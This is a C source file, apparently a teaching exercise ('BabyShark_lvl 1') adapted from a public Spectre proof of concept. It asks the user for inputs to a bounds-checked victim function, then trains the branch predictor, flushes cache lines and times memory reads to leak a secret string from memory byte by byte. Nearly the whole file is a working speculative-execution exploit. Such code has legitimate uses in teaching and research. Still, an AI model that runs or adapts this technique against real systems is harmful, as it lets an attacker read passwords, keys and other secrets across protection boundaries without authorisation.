#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* code from: https://github.com/chaitanyarahalkar/Spectre-PoC */

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char * secret = "The Magic Words are Sqeamish Ossifraggee";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x, size_t y, size_t z) {
  if (((z + y) > array1_size & ~x)) {
    temp &= array2[array1[x] * 512];
  }
}
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t inputs[6], uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;
  int cpui[4];

  training_x = inputs[5];
  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
	size_t malicious_x = inputs[0];    
    for (j = 30; j > 0; j--) {
      x = inputs[j];
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 500; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */

      /* Call the victim! */
       x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
       x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
     // printf("Args: %d %d %d\n", x, inputs[1], inputs[3]);
      victim_function(x, inputs[1], inputs[3]);

    }

    // __cpuid(&cpui, 0x80000001);
    // printf("%d", cpui[3]);

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];
      // use mfence to serialize rdtsc instead of using rdtscp which doesn't work on cpus 
      _mm_mfence();
    //   time1 = __rdtscp( & junk); /* READ TIMER */
      time1 = __rdtsc(); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
    //   time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      _mm_mfence();
      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = 40;
  uint8_t value[2];
  size_t x[6] = {0, 0, 0, 0, 0, 0};
  char* output = malloc(41);
  size_t input_var;
  printf("Welcome to BabyShark_lvl 1\n");
  printf("In these series of assignments, you will be exploring the Spectre Vulnerability\n");
  printf("Here, you will choose the values that are passed to the vulnerable function\n");

  printf("Enter the first value to be passed to the vulnerable function\n");
  scanf("%zu", &input_var);
  x[1] = input_var;
printf("Enter the second value to be passed to the vulnerable function\n");
  scanf("%zu", &input_var);
  x[2] = input_var;   
printf("Enter the third value to be passed to the vulnerable function\n");
  scanf("%zu", &input_var);  
  x[3] = input_var;  
printf("Enter the fourth value to be passed to the vulnerable function\n");
  scanf("%zu", &input_var);
  x[4] = input_var;
printf("Enter the fifth value to be passed to the vulnerable function\n");  
  scanf("%zu", &input_var);  
  x[5] = input_var; 


  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  x[0] = malicious_x;

  printf("Reading %d bytes:\n", len);
  int str_index = 0;
  while (--len >= 0) {
    readMemoryByte(x, value, score);
    x[0] = x[0] + 1;
    printf("%c", value[0] > 31 && value[0] < 127 ? value[0] : '?');

  }


  return (0);
}

